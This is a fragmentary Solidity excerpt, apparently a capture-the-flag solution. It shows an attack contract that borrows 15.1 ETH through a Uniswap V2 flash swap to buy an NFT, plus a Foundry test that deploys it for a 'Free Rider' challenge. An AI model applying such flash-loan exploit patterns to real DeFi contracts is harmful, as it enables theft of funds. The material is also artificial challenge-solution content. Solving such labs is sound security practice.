...
contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    ...
    function attack() external {
        // Borrow just enough ETH to buy one NFT plus a small buffer for the fee
        uint256 borrowAmount = 15 ether + 0.1 ether;
        uniswapPair.swap(borrowAmount, 0, address(this), abi.encode(uint256(1)));
    }
...
contract FreeRiderChallenge is Test {
    ...
    function test_freeRider() public checkSolvedByPlayer {
        ...
        FreeRiderAttack attacker = new FreeRiderAttack(
            address(uniswapPair),
